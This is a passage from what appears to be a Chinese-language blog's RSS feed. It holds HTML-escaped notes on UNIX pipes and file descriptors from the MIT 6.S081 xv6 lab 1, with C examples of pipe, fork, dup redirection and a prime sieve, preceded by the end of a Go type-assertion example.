&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">var&lt;/span> &lt;span class="nx">i&lt;/span> &lt;span class="kd">interface&lt;/span>&lt;span class="p">{}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">fmt&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;%T, %v\n&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">i&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">i&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="c1">// &amp;lt;nil&amp;gt;, &amp;lt;nil&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nx">i&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="mi">8&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">fmt&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;%T, %v\n&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">i&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">i&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="c1">// int, 8
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nx">v&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">_&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">i&lt;/span>&lt;span class="p">.(&lt;/span>&lt;span class="kt">int&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">fmt&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;%T, %v\n&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">v&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">v&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="c1">// int, 8
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;blockquote>
&lt;p>output&lt;/p>
&lt;/blockquote>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">&amp;lt;nil&amp;gt;, &amp;lt;nil&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">int, 8
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">int, 8
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div></description></item><item><title>UNIX pipeline &amp; file descriptor</title><link>https://resyon.netlify.app/p/unix-pipeline-file-descriptor/</link><pubDate>Sat, 11 Sep 2021 10:49:41 +0800</pubDate><guid>https://resyon.netlify.app/p/unix-pipeline-file-descriptor/</guid><description>&lt;blockquote>
&lt;p>完成&lt;code>6.s081&lt;/code> lab1 后对&lt;code>pipeline&lt;/code>, &lt;code>file descriptor&lt;/code> 有了一定了解，做个笔记&lt;/p>
&lt;/blockquote>
&lt;h2 id="pipeline-pipe">&lt;code>pipeline&lt;/code> (&lt;code>pipe&lt;/code>)&lt;/h2>
&lt;blockquote>
&lt;p>A &lt;code>pipe&lt;/code> is a small kernel buffer exposed to processes as a pair of file descriptors, one for reading and one for writing. Writing data to one end of the pipe makes that data available for reading from the other end of the pipe. Pipes provide a way for processes to communicate.&lt;/p>
&lt;/blockquote>
&lt;h3 id="使用">使用:&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="kt">int&lt;/span> &lt;span class="n">pd&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">];&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// make pipeline, return pd[0] for read, pd[1] for write
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nf">pipe&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">pd&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">){&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// handle fail
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nf">fprintf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">stderr&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;fail to make pipeline&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">exit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">int&lt;/span> &lt;span class="n">pid&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">fork&lt;/span>&lt;span class="p">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">pid&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">){&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// handle fail
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="k">else&lt;/span> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">pid&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">){&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// child
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="kt">char&lt;/span> &lt;span class="n">cnt&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s">&amp;#34;this is test content from child process&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">write&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">pd&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="n">cnt&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nf">strlen&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">cnt&lt;/span>&lt;span class="p">));&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">exit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>&lt;span class="k">else&lt;/span>&lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// parent
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="kt">char&lt;/span> &lt;span class="n">buf&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">128&lt;/span>&lt;span class="p">];&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// assume that size of content to read would not exceed buf
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nf">read&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">pd&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="n">buf&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">sizeof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">buf&lt;/span>&lt;span class="p">));&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;get buf from child, buf=&amp;lt;%s&amp;gt;&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">buf&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="file-descriptor-fd">&lt;code>file descriptor&lt;/code> (&lt;code>fd&lt;/code>)&lt;/h2>
&lt;p>&lt;code>fd&lt;/code>是对广义上的&lt;code>UNIX file&lt;/code>进行引用的一层抽象，这层抽象使得在操作&lt;code>regular file&lt;/code>, &lt;code>device&lt;/code>, &lt;code>pipeline&lt;/code> 等文件时，表面上一致，操作起来简单，(都可使用&lt;code>read(int fd,..)&lt;/code>; &lt;code>write(int fd,...)&lt;/code>等透过&lt;code>fd&lt;/code>的&lt;code>API&lt;/code>), 但实现上，不同类型的文件大不相同.&lt;/p>
&lt;h3 id="几个重要的fd特性">几个重要的&lt;code>fd&lt;/code>特性&lt;/h3>
&lt;ul>
&lt;li>总是自动打开3个&lt;code>fd&lt;/code>, 0=&lt;code>stdin&lt;/code> , 1=&lt;code>stdout&lt;/code>, 2=&lt;code>stderr&lt;/code>&lt;/li>
&lt;li>总是选取最小的&lt;code>fd&lt;/code>&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="nf">close&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">int&lt;/span> &lt;span class="n">fd&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">open&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;/tmp/test.c&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">O_RDONLY&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nf">fprintf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">stderr&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;fd=%d&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">fd&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="c1">// fd=1
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;ul>
&lt;li>&lt;code>file descriptor table&lt;/code>由进程维护，即进程间&lt;code>fd&lt;/code>互不影响&lt;/li>
&lt;/ul>
&lt;blockquote>
&lt;p>以下代码来自&lt;code>lab 1&lt;/code>实验&lt;code>primes&lt;/code>, 实现了下图所示的&lt;code>埃氏筛法&lt;/code>
&lt;img src="https://resyon.netlify.app/upload/2021/09/image-a50ab1eafdde4f5d8e9516ed77376b38.png"
loading="lazy"
alt="image.png"
>
为摆脱&lt;code>xv6&lt;/code>对&lt;code>fd&lt;/code>数目的限制，每个子进程都对管道传入的&lt;code>fd&lt;/code>进行了多次重定向, 但在子进程改变&lt;code>fd&lt;/code>并不影响父进程，程序能正常执行&lt;/p>
&lt;/blockquote>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;span class="lnt">38
&lt;/span>&lt;span class="lnt">39
&lt;/span>&lt;span class="lnt">40
&lt;/span>&lt;span class="lnt">41
&lt;/span>&lt;span class="lnt">42
&lt;/span>&lt;span class="lnt">43
&lt;/span>&lt;span class="lnt">44
&lt;/span>&lt;span class="lnt">45
&lt;/span>&lt;span class="lnt">46
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// redirect pd[k] to k, both pd[k] and k are fd
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="k">static&lt;/span> &lt;span class="kt">void&lt;/span> &lt;span class="nf">redirect&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">k&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">pd&lt;/span>&lt;span class="p">[]){&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">close&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">k&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">dup&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">pd&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">k&lt;/span>&lt;span class="p">]);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">close&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">pd&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">close&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">pd&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">static&lt;/span> &lt;span class="kt">void&lt;/span> &lt;span class="nf">loop&lt;/span>&lt;span class="p">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">int&lt;/span> &lt;span class="n">p&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">v&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">pid&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">int&lt;/span> &lt;span class="n">pd&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">];&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nf">read&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">p&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">sizeof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span>&lt;span class="p">))){&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;prime %d&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">p&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">pipe&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">pd&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">pid&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">fork&lt;/span>&lt;span class="p">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">pid&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">){&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">fprintf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">stderr&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;fail to fork, current pid=%d&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nf">getpid&lt;/span>&lt;span class="p">());&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>&lt;span class="k">else&lt;/span> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">pid&lt;/span> &lt;span class="o">&amp;gt;&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">){&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">redirect&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">pd&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">loop&lt;/span>&lt;span class="p">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>&lt;span class="k">else&lt;/span>&lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">redirect&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">pd&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">while&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nf">read&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">v&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">sizeof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span>&lt;span class="p">))){&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">v&lt;/span> &lt;span class="o">%&lt;/span> &lt;span class="n">p&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">){&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">write&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">v&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">sizeof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span>&lt;span class="p">));&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">int&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">int&lt;/span> &lt;span class="n">p&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">];&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">pipe&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">p&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nf">fork&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">){&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">redirect&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">p&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">loop&lt;/span>&lt;span class="p">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>&lt;span class="k">else&lt;/span>&lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">redirect&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">p&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="mi">35&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">){&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">write&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">sizeof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span>&lt;span class="p">));&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">exit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;ul>
&lt;li>经由&lt;code>fork&lt;/code>和&lt;code>dup&lt;/code>得到，的对同一文件的&lt;code>fd&lt;/code>, 它们共享偏移&lt;/li>
&lt;/ul>
&lt;blockquote>
&lt;p>fork&lt;/p>
&lt;/blockquote>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nf">fork&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">){&lt;/span>
